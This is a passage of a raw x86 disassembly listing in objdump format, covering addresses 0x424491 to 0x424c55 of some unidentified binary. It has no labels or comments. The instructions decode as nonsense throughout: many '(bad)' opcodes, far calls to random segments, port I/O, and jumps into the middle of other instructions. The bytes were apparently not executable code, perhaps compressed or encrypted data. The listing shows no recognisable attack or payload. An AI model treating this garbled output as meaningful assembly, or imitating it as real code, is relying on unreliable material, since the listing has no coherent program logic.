  424491:	xchg   edi,eax
  424492:	stc    
  424493:	jl     0x4244ab
  424495:	(bad)  
  424496:	arpl   WORD PTR [esi+0x12269cb2],dx
  42449c:	adc    al,0xfb
  42449e:	jecxz  0x424519
  4244a0:	mov    dh,0xe7
  4244a2:	mov    al,ds:0x93288ea7
  4244a7:	pushf  
  4244a8:	cmp    al,0x7a
  4244aa:	or     edi,0x8d9a7dcd
  4244b0:	xchg   edx,eax
  4244b1:	inc    ecx
  4244b3:	sbb    BYTE PTR [ebp+0x17],al
  4244b6:	push   ss
  4244b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244b8:	enter  0x8bf3,0xf8
  4244bc:	ret    0x965b
  4244bf:	add    esi,DWORD PTR [ebx+0x7048bcf6]
  4244c5:	(bad)  
  4244c6:	paddw  mm0,QWORD PTR [esi+0x59]
  4244ca:	rcl    ebp,1
  4244cc:	fimul  WORD PTR [ebx]
  4244ce:	shl    DWORD PTR [edx],0x65
  4244d1:	mov    bh,0xb6
  4244d3:	ror    al,cl
  4244d5:	cmc    
  4244d6:	test   DWORD PTR [ebx+eiz*2],esi
  4244d9:	ret    
  4244da:	pop    edx
  4244db:	call   0xbca:0x87925da0
  4244e2:	jae    0x424536
  4244e4:	sbb    DWORD PTR [edi-0x4e],ebp
  4244e7:	ss ffree st(1)
  4244ea:	xchg   ebp,eax
  4244eb:	(bad)
  4244ee:	and    ah,BYTE PTR [edi+edi*4-0x62d0fe5e]
  4244f5:	pop    ebx
  4244f6:	(bad)  
  4244f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244f8:	fcmovb st,st(5)
  4244fa:	popf   
  4244fb:	mov    DWORD PTR [ebp+ecx*1+0x4db2fcf0],eax
  424502:	xchg   ebx,eax
  424503:	stos   DWORD PTR es:[edi],eax
  424504:	xchg   esi,eax
  424505:	or     ebx,0x81789b11
  42450b:	mov    al,ds:0xba7875fa
  424510:	arpl   WORD PTR [ebx+0x15ec6fd5],bx
  424516:	mov    esp,0x9df56f1e
  42451b:	icebp  
  42451c:	push   ss
  42451d:	mov    ds:0xf018646a,eax
  424522:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  424524:	mov    bl,0x50
  424526:	leave  
  424527:	jle    0x42452d
  424529:	jb     0x42459c
  42452b:	dec    ebx
  42452c:	mov    cl,0xa9
  42452e:	out    dx,eax
  42452f:	inc    esp
  424530:	ja     0x4244fd
  424532:	jle    0x4245a3
  424534:	push   es
  424535:	cmc    
  424536:	push   es
  424537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424538:	jg     0x4245ae
  42453a:	out    dx,al
  42453b:	pop    ebp
  42453c:	test   DWORD PTR [edi+0x2],ecx
  42453f:	xor    BYTE PTR [edi+0x114895a6],dl
  424545:	rol    DWORD PTR [edi],cl
  424547:	addr16 xchg esi,eax
  424549:	lock scas al,BYTE PTR es:[edi]
  42454b:	fnstenv [ebx+0x5]
  42454e:	mov    esp,DWORD PTR [esi+eiz*8-0x65a8252c]
  424555:	mov    ebx,0x128f827d
  42455a:	stc    
  42455b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42455c:	mov    cs,WORD PTR [ecx]
  42455e:	cli    
  42455f:	mov    ecx,0xa77f7624
  424564:	jne    0x4245b5
  424566:	xchg   ecx,eax
  424567:	(bad)  
  424568:	or     eax,0xb19105bc
  42456d:	mov    eax,0xabf8fe10
  424572:	jl     0x42451b
  424574:	mov    eax,0x30d29e46
  424579:	and    ebx,edi
  42457b:	xchg   edx,eax
  42457c:	mov    ch,0x5c
  42457e:	dec    esi
  42457f:	mov    fs,WORD PTR [edi-0x1b]
  424582:	pop    edx
  424583:	fild   QWORD PTR [ebx-0x70445bc3]
  424589:	xchg   ebx,eax
  42458a:	push   esp
  42458b:	in     al,0x26
  42458d:	push   ss
  42458e:	test   DWORD PTR [ebp+0x42],eax
  424591:	push   ds
  424592:	pop    esp
  424593:	aad    0xb2
  424595:	sbb    al,0xc4
  424597:	pop    edi
  424598:	push   edx
  424599:	shl    BYTE PTR [esi+0x520fac54],0x1a
  4245a0:	sub    eax,0x5767095c
  4245a5:	std    
  4245a6:	cwde   
  4245a7:	out    dx,eax
  4245a8:	mov    dl,0xaa
  4245aa:	push   cs
  4245ab:	(bad)  
  4245ac:	fisttp DWORD PTR [eax]
  4245ae:	popa   
  4245af:	push   ebx
  4245b0:	out    0xbb,al
  4245b2:	mov    dh,0xa7
  4245b4:	scas   eax,DWORD PTR es:[edi]
  4245b5:	and    DWORD PTR [esi],eax
  4245b7:	notrack jmp DWORD PTR [ebx]
  4245ba:	push   ebp
  4245bb:	push   0xffffffb2
  4245bd:	mov    dl,0x4a
  4245bf:	jne    0x42459d
  4245c1:	aas    
  4245c2:	pop    esi
  4245c3:	jnp    0x424545
  4245c5:	cmc    
  4245c6:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4245c8:	mov    cl,BYTE PTR [edi+0x54]
  4245cb:	and    BYTE PTR [ebx-0x44],cl
  4245ce:	xchg   ebx,eax
  4245cf:	xlat   BYTE PTR ds:[ebx]
  4245d0:	ret    0x62bd
  4245d3:	mov    edi,0x243d159a
  4245d8:	mov    ch,0x53
  4245da:	push   edx
  4245db:	fs lock push ss
  4245de:	jp     0x4245d5
  4245e0:	outs   dx,BYTE PTR ds:[esi]
  4245e1:	pop    es
  4245e2:	stc    
  4245e3:	test   al,0xa2
  4245e5:	pop    ebp
  4245e6:	shr    DWORD PTR [ebp+0x5fbfaa12],1
  4245ec:	aaa    
  4245ed:	add    BYTE PTR [edx+0x4e],ah
  4245f0:	mov    dl,0x4d
  4245f2:	cmp    dl,BYTE PTR [edi+0x4c]
  4245f5:	aam    0xa6
  4245f7:	rol    DWORD PTR [eax],1
  4245f9:	add    al,0x4d
  4245fb:	fmul   DWORD PTR [ecx]
  4245fd:	push   es
  4245fe:	cmp    bl,BYTE PTR [esi+0x50984231]
  424604:	mov    dl,0xad
  424606:	in     eax,dx
  424607:	add    BYTE PTR [edi+0x15],0x38
  42460b:	cmp    eax,0x43d00b24
  424610:	(bad)  
  424611:	aaa    
  424612:	jb     0x4245a8
  424614:	mov    ah,BYTE PTR [eax]
  424616:	call   0x9034:0xcb24efef
  42461d:	dec    edx
  42461e:	push   edx
  42461f:	mov    ds:0x479bb6a5,eax
  424624:	imul   ecx,DWORD PTR [ebx-0x1c861f51],0xffffff9a
  42462b:	pop    edi
  42462c:	sub    al,0x5
  42462e:	stos   BYTE PTR es:[edi],al
  42462f:	ret    0xd726
  424632:	cmp    ah,BYTE PTR [edi-0x5f0cc1c7]
  424638:	sbb    DWORD PTR [ebx+0x29b2e46b],ecx
  42463e:	mov    ah,0x73
  424640:	jmp    DWORD PTR [ecx-0x25]
  424643:	fstp   QWORD PTR [ebx]
  424645:	xor    al,0xb1
  424647:	xor    dh,BYTE PTR [edx-0x7dd79566]
  42464d:	and    DWORD PTR [ecx],edi
  42464f:	adc    al,0xb2
  424651:	jp     0x4246b5
  424653:	cmp    cl,ah
  424655:	cmp    eax,0xb88b36d
  42465a:	shl    DWORD PTR [edx+0x136ae231],0xe4
  424661:	sbb    BYTE PTR [edx+0x7535643e],bl
  424667:	add    ebx,ebp
  424669:	sub    al,0x6f
  42466b:	pop    ecx
  42466c:	mov    ecx,DWORD PTR [ebx]
  42466e:	daa    
  42466f:	mov    esi,DWORD PTR [ecx+0x3d]
  424672:	into   
  424673:	leave  
  424674:	mov    dh,0x8b
  424676:	test   BYTE PTR ds:0xfbc6a622,dl
  42467c:	mov    dl,0xe2
  42467e:	pop    ds
  42467f:	add    eax,0xa71ccb91
  424684:	mov    bl,0xee
  424686:	xor    eax,0xde296112
  42468b:	mov    edi,0xe20fccb2
  424690:	and    dh,BYTE PTR [eax+0xbd0efe1]
  424696:	cmp    esi,DWORD PTR [ecx]
  424698:	dec    ebp
  424699:	pop    edi
  42469a:	inc    ebx
  42469b:	mov    esi,0x3f9e3f06
  4246a0:	(bad)  
  4246a1:	dec    ebp
  4246a2:	icebp  
  4246a3:	mov    ds:0xc603e332,eax
  4246a8:	(bad)  
  4246a9:	or     esp,DWORD PTR [eax+0x25]
  4246ac:	repnz (bad) 
  4246ae:	mov    al,0xbd
  4246b0:	jg     0x424649
  4246b2:	call   0x93b0:0xb740785b
  4246b9:	(bad)  
  4246ba:	out    0xa7,eax
  4246bc:	sub    eax,0x50693af3
  4246c1:	iret   
  4246c2:	pop    ds
  4246c3:	mov    WORD PTR [ebp+0x49d2899b],?
  4246c9:	aam    0x5b
  4246cb:	inc    esi
  4246cc:	push   cs
  4246cd:	es jns 0x42471f
  4246d0:	(bad)  
  4246d1:	jge    0x4246e8
  4246d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246d4:	test   dh,cl
  4246d6:	inc    edx
  4246d7:	adc    edx,DWORD PTR [edx+0x3f]
  4246da:	jns    0x4246a3
  4246dc:	mov    dl,0x1
  4246de:	scas   eax,DWORD PTR es:[edi]
  4246df:	fcom   QWORD PTR [ecx-0x18575f78]
  4246e5:	or     esi,DWORD PTR [edx-0x36]
  4246e8:	jmp    0x42466d
  4246ea:	jmp    0x42471e
  4246ec:	loope  0x424736
  4246ee:	xchg   DWORD PTR [ebp-0x5f9f2796],edi
  4246f4:	aaa    
  4246f5:	scas   eax,DWORD PTR es:[edi]
  4246f6:	mov    ch,0xec
  4246f8:	and    ah,BYTE PTR [eax]
  4246fa:	imul   DWORD PTR [ecx-0x1]
  4246fd:	or     DWORD PTR [edx+eax*4-0x73],esp
  424701:	test   al,0x87
  424703:	jecxz  0x4246ec
  424705:	or     ecx,DWORD PTR [ebx-0x15b2a245]
  42470b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42470c:	and    DWORD PTR [ebp+0x12],edx
  42470f:	pop    esi
  424710:	lods   eax,DWORD PTR ds:[esi]
  424711:	hlt    
  424712:	int3   
  424713:	xor    bl,BYTE PTR [edx-0x31ec1d33]
  424719:	xchg   edi,eax
  42471a:	popf   
  42471b:	in     eax,0xb7
  42471d:	pushf  
  42471e:	sub    ebp,DWORD PTR [edx+0x53efb6e2]
  424724:	push   ecx
  424725:	or     edi,ebx
  424727:	scas   al,BYTE PTR es:[edi]
  424728:	push   ebp
  424729:	mov    esp,0x95c0b03f
  42472e:	call   0x5efd:0x7a3a2c0
  424735:	mov    al,BYTE PTR [ebx+0x58b564a7]
  42473b:	call   0x6efe:0xdb610981
  424742:	sahf   
  424743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424744:	lods   eax,DWORD PTR ds:[esi]
  424745:	sbb    bl,cl
  424747:	mov    WORD PTR [esi-0x2d],?
  42474a:	mov    ebp,0xca9b72a7
  42474f:	enter  0xa281,0x48
  424753:	jns    0x424707
  424755:	cmp    ecx,DWORD PTR [edi+0x3848c65d]
  42475b:	movq   QWORD PTR [ecx],mm6
  42475e:	into   
  42475f:	push   ss
  424760:	mov    dh,0xd8
  424762:	adc    al,0x7d
  424764:	mov    esp,0x7ca69aa4
  424769:	dec    ebx
  42476a:	mov    al,0x3e
  42476c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42476d:	or     ecx,edx
  42476f:	in     eax,dx
  424770:	pop    ebx
  424771:	ss cwde 
  424773:	repz mov cl,0x94
  424776:	call   0x8473:0x9cdddc09
  42477d:	mov    al,ds:0xb5cea76b
  424782:	jne    0x4247d8
  424784:	fdiv   DWORD PTR [edx-0x334da130]
  42478a:	xchg   ebx,eax
  42478b:	and    DWORD PTR [ecx+0x33bca274],edx
  424791:	xor    DWORD PTR [ebx+ebp*8+0x3a401135],eax
  424798:	cmc    
  424799:	sbb    DWORD PTR [ecx+0x44],esp
  42479c:	push   edx
  42479d:	jl     0x4247e0
  42479f:	add    dl,BYTE PTR [edx+ebx*1+0x75b2498c]
  4247a6:	push   ss
  4247a7:	adc    BYTE PTR [ecx+0x4aa02be3],dh
  4247ad:	jge    0x424796
  4247af:	sbb    bh,BYTE PTR [edx]
  4247b1:	jnp    0x4247f7
  4247b3:	nop
  4247b4:	inc    esi
  4247b5:	sti    
  4247b6:	popf   
  4247b7:	into   
  4247b8:	(bad)  
  4247b9:	xor    al,BYTE PTR [esi]
  4247bb:	lea    esi,[edx-0xf]
  4247be:	pop    ebp
  4247bf:	adc    bh,ah
  4247c1:	loope  0x424814
  4247c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247c4:	hlt    
  4247c5:	pop    edx
  4247c6:	out    0x2e,al
  4247c8:	inc    eax
  4247c9:	adc    DWORD PTR [ecx+0x54],eax
  4247cc:	mov    esp,0xbf8bb110
  4247d1:	fs ss loopne 0x42481d
  4247d5:	loope  0x424851
  4247d7:	cmp    eax,0xa7295a61
  4247dc:	xchg   edi,eax
  4247dd:	jbe    0x424781
  4247df:	in     al,dx
  4247e0:	(bad)  
  4247e1:	push   0x76
  4247e3:	add    al,0xb2
  4247e5:	inc    esi
  4247e6:	(bad)  
  4247e8:	sub    eax,0x92118652
  4247ed:	adc    eax,0xad5fca3
  4247f2:	mov    ebp,0x4b6f3ea6
  4247f8:	ds push ss
  4247fa:	call   0x655d:0x91c6309c
  424801:	loope  0x424840
  424803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424804:	es dec eax
  424806:	out    dx,al
  424807:	sbb    al,0xb6
  424809:	jp     0x424825
  42480b:	cmp    al,0x7b
  42480d:	jle    0x42479d
  42480f:	and    eax,0x366f1b2
  424814:	sub    DWORD PTR [edx],ecx
  424816:	(bad)  
  424817:	push   ss
  424818:	cmp    DWORD PTR [ebx],ecx
  42481a:	jle    0x4247f2
  42481c:	mov    cl,BYTE PTR [ecx]
  42481e:	mov    ecx,DWORD PTR [edi]
  424820:	sub    edx,esp
  424822:	call   0xe75b:0x55a12510
  424829:	test   al,0x83
  42482b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42482c:	jmp    0x424842
  42482e:	push   ebp
  424830:	cmp    bh,dl
  424832:	jp     0x424808
  424834:	leave  
  424835:	xor    ebx,DWORD PTR [eax-0x18d0d068]
  42483b:	loop   0x42489b
  42483d:	imul   ebx,ebp,0x14
  424840:	ror    DWORD PTR [ebx],cl
  424842:	mov    DWORD PTR [eax+0x3411412a],esi
  424848:	mov    dh,0xf2
  42484a:	cwde   
  42484b:	dec    esi
  42484c:	bound  ebp,QWORD PTR [edx]
  42484e:	and    al,0x5b
  424850:	adc    ebx,ebp
  424852:	in     eax,dx
  424853:	jmp    0x42489b
  424855:	stc    
  424856:	out    0xa7,al
  424858:	retf   0x7b9d
  42485b:	popa   
  42485c:	fs mov ebx,edi
  42485f:	cdq    
  424860:	mov    ebp,0x4d4b2033
  424865:	or     dl,bh
  424867:	or     al,0x6e
  424869:	(bad)  
  42486a:	outs   dx,BYTE PTR ds:[esi]
  42486b:	jmp    0x424848
  42486d:	or     edi,esp
  42486f:	sbb    ecx,DWORD PTR [edi+0x1e1ea932]
  424875:	xchg   ebp,eax
  424876:	call   0x7fb4:0x9e923680
  42487d:	xchg   DWORD PTR [ebx-0x805a559],edi
  424883:	sub    bl,BYTE PTR [ecx-0x326247e5]
  424889:	jns    0x424825
  42488b:	mov    ebx,0x8d1e048b
  424890:	sub    bh,dh
  424892:	sbb    al,0xa6
  424894:	jmp    0xa6c9:0x4cae55cf
  42489b:	addr16 inc edx
  42489d:	ret    0x1d84
  4248a0:	das    
  4248a1:	ja     0x4248aa
  4248a3:	cmc    
  4248a4:	xor    BYTE PTR [ebp-0x15c48b22],dh
  4248aa:	enter  0x62fb,0x6c
  4248ae:	cmp    BYTE PTR [esi-0x5784d5a3],ah
  4248b4:	push   ecx
  4248b5:	popf   
  4248b6:	pop    edx
  4248b7:	inc    edi
  4248b8:	call   0xa780:0x15539a3e
  4248bf:	dec    ecx
  4248c0:	test   DWORD PTR [ecx],edx
  4248c2:	mov    ebx,0xe612a683
  4248c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248c8:	or     al,0xa7
  4248ca:	sub    al,0x32
  4248cc:	sbb    esi,DWORD PTR [ebx]
  4248ce:	call   0x89de:0x7955098f
  4248d5:	cmp    dh,BYTE PTR [eax]
  4248d7:	pushf  
  4248d8:	or     dh,BYTE PTR [ecx+0x1a]
  4248db:	mov    cl,0x49
  4248dd:	jg     0x4248fd
  4248df:	mov    ecx,0x439aec9e
  4248e4:	repnz arpl WORD PTR [ecx+0x1fb0b828],cx
  4248eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248ec:	inc    esp
  4248ed:	fild   DWORD PTR [edx+0x3aa0e82b]
  4248f3:	test   BYTE PTR [ecx-0x5b84f13],dh
  4248f9:	mov    BYTE PTR [edi+ecx*1+0x18],dh
  4248fd:	(bad)  
  4248fe:	xor    ah,BYTE PTR [edi-0x2ceba78d]
  424904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424905:	add    BYTE PTR ds:0xa301b25c,0x52
  42490c:	jbe    0x4248cf
  42490e:	in     eax,0x79
  424910:	call   0xad0b0720
  424915:	mov    al,ds:0x5a7fe9d8
  42491a:	add    ah,BYTE PTR [edi+ecx*8-0x4d538549]
  424921:	enter  0x8aff,0x69
  424925:	ins    DWORD PTR es:[edi],dx
  424926:	gs imul ebx,ebx,0xe1d0010a
  42492d:	mov    esp,0xcb62b007
  424932:	mov    esi,0xe3feb24d
  424937:	pop    ebp
  424938:	ret    
  424939:	fwait
  42493a:	xchg   ebx,eax
  42493b:	(bad)  
  42493c:	(bad)  
  42493d:	loope  0x424981
  42493f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424940:	cmp    BYTE PTR ds:0xe9ca19e4,ah
  424946:	add    eax,0x19d0b2d2
  42494b:	imul   esp,DWORD PTR ds:0x92a3631a,0x5c52900b
  424955:	or     cl,BYTE PTR [eax-0x795488eb]
  42495b:	stos   DWORD PTR es:[edi],eax
  42495c:	push   es
  42495d:	icebp  
  42495e:	fwait
  42495f:	push   eax
  424960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424961:	xchg   edi,eax
  424962:	fld    DWORD PTR es:[esi+0x45]
  424966:	mov    edi,0x328d3da0
  42496b:	mov    cl,0xf
  42496d:	sub    esp,esi
  42496f:	mov    ah,0x1e
  424971:	in     al,dx
  424972:	xchg   DWORD PTR [ecx+0x41db5612],ebx
  424978:	ror    BYTE PTR [eax+0x204a9f22],cl
  42497e:	xor    BYTE PTR [ebx+0x7d96c1cd],dh
  424984:	mov    dl,0xa
  424986:	and    esi,DWORD PTR ds:0xf7beab76
  42498c:	into   
  42498d:	(bad)  
  42498e:	call   0x8d11:0x4d46c415
  424995:	in     eax,0xae
  424997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424998:	(bad)  [edx+eax*1+0x47]
  42499c:	not    DWORD PTR [edx+0x33]
  42499f:	popf   
  4249a0:	mov    dl,0x4b
  4249a2:	sbb    ebp,esp
  4249a4:	mov    eax,0xc164509f
  4249a9:	add    al,0x77
  4249ab:	sbb    DWORD PTR [eax-0x43675b49],edx
  4249b1:	loop   0x42495e
  4249b3:	mov    edx,0xe6e754dc
  4249b8:	retf   
  4249b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249ba:	sahf   
  4249bb:	mov    eax,0xfa8fffdc
  4249c0:	mov    ch,0xdf
  4249c2:	mov    ah,0x3
  4249c4:	dec    ecx
  4249c5:	imul   edi,DWORD PTR [edx+0x59],0xffffffe5
  4249c9:	in     eax,0x82
  4249cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249cc:	push   ds
  4249cd:	pop    edx
  4249ce:	icebp  
  4249cf:	cld    
  4249d0:	push   ebp
  4249d1:	xchg   esi,eax
  4249d2:	pop    ebp
  4249d3:	out    0xb0,eax
  4249d5:	in     eax,dx
  4249d6:	xor    eax,0x9ab8ab5
  4249db:	(bad)  
  4249dc:	(bad)  [ecx]
  4249de:	and    ah,BYTE PTR [edi+0x151ef426]
  4249e4:	scas   al,BYTE PTR es:[edi]
  4249e5:	pop    edi
  4249e6:	cld    
  4249e7:	cmp    eax,0xa18b7cae
  4249ec:	mov    dl,0x7a
  4249ee:	outs   dx,BYTE PTR ds:[esi]
  4249ef:	or     ebp,ecx
  4249f1:	add    ebp,DWORD PTR [eax+0xea169a7]
  4249f7:	popa   
  4249f8:	fwait
  4249f9:	aad    0x17
  4249fb:	jge    0x4249af
  4249fd:	mov    dh,0x1e
  4249ff:	repz fiadd DWORD PTR [esi+edx*2]
  424a03:	sub    BYTE PTR [edx+0xb],bh
  424a06:	pop    eax
  424a07:	sub    esp,DWORD PTR [ebx]
  424a09:	(bad)  
  424a0a:	out    0x29,al
  424a0c:	and    DWORD PTR [edx],0x8ecd5b9b
  424a12:	adc    eax,ebp
  424a14:	mov    ds:0x8e17e06f,al
  424a19:	call   FWORD PTR [edx-0x3789d4a6]
  424a1f:	(bad)  
  424a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a21:	xlat   BYTE PTR ds:[ebx]
  424a22:	push   edi
  424a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a24:	cmp    DWORD PTR [eax+0x14],ebp
  424a27:	fisttp QWORD PTR [ecx-0x43abc4da]
  424a2d:	bound  ebp,QWORD PTR [ebx]
  424a2f:	or     esp,edi
  424a31:	sub    esi,DWORD PTR [ebp+0x76ef0e00]
  424a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a38:	test   DWORD PTR [edi],ebx
  424a3a:	(bad)
  424a3d:	nop
  424a3e:	mov    bh,BYTE PTR [ebx+0x1f675eb2]
  424a44:	mov    edi,0x9ecba509
  424a49:	jbe    0x424a19
  424a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a4c:	inc    edx
  424a4d:	mov    ch,0x0
  424a4f:	daa    
  424a50:	inc    eax
  424a51:	bound  esi,QWORD PTR [edi+eiz*2-0x55]
  424a55:	das    
  424a56:	call   0x13fe:0x4bb1649f
  424a5d:	dec    eax
  424a5e:	push   cs
  424a5f:	aas    
  424a60:	fisttp QWORD PTR [ebx]
  424a62:	or     DWORD PTR [edx+eax*8+0x247d1839],esp
  424a69:	imul   esp,DWORD PTR [eax-0x3174d191],0x5f278f8a
  424a73:	adc    BYTE PTR [ecx],dl
  424a75:	jo     0x424a94
  424a77:	mov    ds:0xd5680815,eax
  424a7c:	cwde   
  424a7d:	retf   
  424a7e:	rcl    ecx,cl
  424a80:	sub    al,0x7b
  424a82:	call   0x4733:0xbc596589
  424a89:	aad    0x59
  424a8b:	xlat   BYTE PTR ds:[ebx]
  424a8c:	out    0xb,al
  424a8e:	sbb    ebp,ecx
  424a90:	mov    edi,0xdab11dc3
  424a95:	sub    esp,esi
  424a97:	lds    esp,FWORD PTR [ebp-0x4dadd426]
  424a9d:	and    DWORD PTR [esi+0x688e0e70],esp
  424aa3:	ficomp DWORD PTR [ebx+ecx*1+0x5087dbc2]
  424aaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424aab:	adc    DWORD PTR [esi],eax
  424aad:	aad    0xa
  424aaf:	test   al,0x8b
  424ab1:	sub    BYTE PTR [esi-0x58],ah
  424ab4:	push   ecx
  424ab5:	je     0x424aad
  424ab7:	rcr    DWORD PTR [di],cl
  424aba:	sbb    edx,DWORD PTR [edi+ecx*4+0xb]
  424abe:	pop    edx
  424abf:	ja     0x424a7b
  424ac1:	in     eax,0x62
  424ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ac4:	pop    esi
  424ac5:	mov    esp,0xe2aae29d
  424aca:	mov    ah,0xb1
  424acc:	xchg   edx,eax
  424acd:	and    al,0x72
  424acf:	call   FWORD PTR [ebx+0x14fae40b]
  424ad5:	scas   al,BYTE PTR es:[edi]
  424ad6:	pop    ds
  424ad7:	cmp    BYTE PTR [esi],al
  424ad9:	lahf   
  424ada:	test   DWORD PTR [edx+0x62daf21c],ecx
  424ae0:	bound  ebp,QWORD PTR [edi]
  424ae2:	test   esp,0x48bd0b59
  424ae8:	push   ecx
  424ae9:	mov    ds:0x49b33eb6,al
  424aee:	call   0xde8e:0x6e71d358
  424af5:	ss sbb eax,0xdbc98da7
  424afb:	aaa    
  424afc:	xchg   ecx,eax
  424afd:	inc    esi
  424afe:	fldcw  WORD PTR [ecx-0x58ee5a76]
  424b04:	fadd   st,st(3)
  424b06:	test   dh,dl
  424b08:	pop    es
  424b09:	stos   BYTE PTR es:[edi],al
  424b0a:	arpl   WORD PTR [ebx-0x18d83199],di
  424b10:	adc    eax,0xeca140cd
  424b15:	clc    
  424b16:	js     0x424b5c
  424b18:	mov    dl,0x63
  424b1a:	mov    es,WORD PTR [edi-0x71f6709e]
  424b20:	fmul   DWORD PTR [ebx]
  424b22:	pop    ss
  424b23:	cdq    
  424b24:	dec    ecx
  424b25:	fisub  WORD PTR [ebx+0x76f5d0a5]
  424b2b:	dec    ebx
  424b2c:	mov    dl,0x30
  424b2e:	in     al,dx
  424b2f:	add    ebp,ebx
  424b31:	adc    DWORD PTR [ebx+ebx*2+0x57],0x137e2e0b
  424b39:	scas   eax,DWORD PTR es:[edi]
  424b3a:	ret    
  424b3b:	jp     0x424afb
  424b3d:	push   ebp
  424b3e:	mov    dh,0x55
  424b40:	pop    ebx
  424b41:	or     al,0x89
  424b43:	clc    
  424b44:	sbb    bh,BYTE PTR [esi]
  424b46:	call   0x2461:0x5ac2c134
  424b4d:	mov    BYTE PTR [edx-0x4a9c995a],bl
  424b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b54:	stos   BYTE PTR es:[edi],al
  424b55:	mov    ds:0x4c7fa787,al
  424b5a:	add    BYTE PTR [eax-0x5b],0x6c
  424b5e:	mov    edi,0x404bb513
  424b63:	into   
  424b64:	inc    esp
  424b65:	js     0x424b51
  424b67:	ret    
  424b68:	jns    0x424b76
  424b6a:	xchg   dh,bl
  424b6c:	int3   
  424b6d:	or     ebx,DWORD PTR [edi]
  424b6f:	adc    DWORD PTR [ebx-0x73],0xd1b860cc
  424b76:	call   0x214a:0xd679b9cc
  424b7d:	fbstp  TBYTE PTR [ebx]
  424b7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b80:	adc    bl,BYTE PTR [eax]
  424b82:	mov    esp,0xf070cd8f
  424b87:	xor    eax,0x753e81b1
  424b8c:	xchg   edi,eax
  424b8d:	add    edx,DWORD PTR [bx]
  424b90:	in     al,0xee
  424b92:	sub    DWORD PTR [edi+0x4075fc2e],esp
  424b98:	or     edi,edx
  424b9a:	aad    0x22
  424b9c:	mov    dl,0x1
  424b9e:	mov    al,ds:0x1f19b1a
  424ba3:	inc    ebx
  424ba4:	out    dx,al
  424ba5:	or     edi,ebx
  424ba7:	jl     0x424b2a
  424ba9:	int3   
  424baa:	sbb    dh,al
  424bac:	call   0xf945e768
  424bb1:	add    DWORD PTR [eax],eax
  424bb3:	aas    
  424bb4:	fimul  WORD PTR [edx+ebp*4]
  424bb7:	jae    0x424bd3
  424bb9:	or     esi,DWORD PTR [edx+0x42]
  424bbc:	xchg   esi,ecx
  424bbe:	dec    ebx
  424bbf:	test   al,0x4
  424bc1:	pop    ds
  424bc2:	call   0xbe2:0xa6b93358
  424bc9:	push   0xe7aa788
  424bce:	fwait
  424bcf:	sub    DWORD PTR [eax],0xb39e9c1d
  424bd5:	mov    ebx,0xf87fa33c
  424bda:	sbb    ch,dh
  424bdc:	pop    esi
  424bdd:	dec    ebp
  424bde:	sbb    esp,DWORD PTR [edi-0xe2da0f9]
  424be4:	lahf   
  424be5:	xor    cl,BYTE PTR [ebp+edx*8-0x5ca8964e]
  424bec:	pop    esp
  424bed:	int3   
  424bee:	lock test eax,0x684043c3
  424bf4:	mov    bl,0x24
  424bf6:	mov    esi,0x17a70296
  424bfb:	(bad)  
  424bfc:	jo     0x424b92
  424bfe:	stos   BYTE PTR es:[edi],al
  424bff:	xchg   cx,ax
  424c01:	xchg   ebx,eax
  424c02:	mov    dl,0xef
  424c04:	mov    ebp,0xb9a1e705
  424c09:	sbb    DWORD PTR [edx-0x33],edi
  424c0c:	xor    BYTE PTR [eax],bh
  424c0e:	mov    dh,BYTE PTR [esi-0x4e]
  424c11:	mov    ah,0xf2
  424c13:	cdq    
  424c14:	daa    
  424c15:	xchg   BYTE PTR [edx],ah
  424c17:	inc    esp
  424c18:	xor    ecx,DWORD PTR [ebx]
  424c1a:	jb     0x424bfe
  424c1c:	mov    bh,BYTE PTR [ebx+0x2cf8884c]
  424c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c23:	arpl   WORD PTR [ecx],di
  424c25:	mov    WORD PTR [ecx+0xb],ds
  424c28:	mov    ds:0x2bc54a28,eax
  424c2d:	test   DWORD PTR [edx],esi
  424c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c30:	mov    dh,dh
  424c32:	arpl   bp,dx
  424c34:	js     0x424bf8
  424c36:	cmp    ch,BYTE PTR [eax]
  424c38:	pop    esi
  424c39:	js     0x424bd8
  424c3b:	shl    DWORD PTR [edi+0x324d8274],0x44
  424c42:	rcr    ecx,1
  424c44:	push   esp
  424c45:	sbb    al,0x75
  424c47:	pop    ebp
  424c48:	jns    0x424c55
  424c4a:	test   BYTE PTR [ebp+0x12],dh
  424c4d:	jno    0x424bd6
  424c4f:	(bad)  
  424c50:	mov    cl,0x1
  424c52:	out    dx,al
  424c53:	ss dec edi
  424c55:	rcl    DWORD PTR [ebx+ebp*4],1
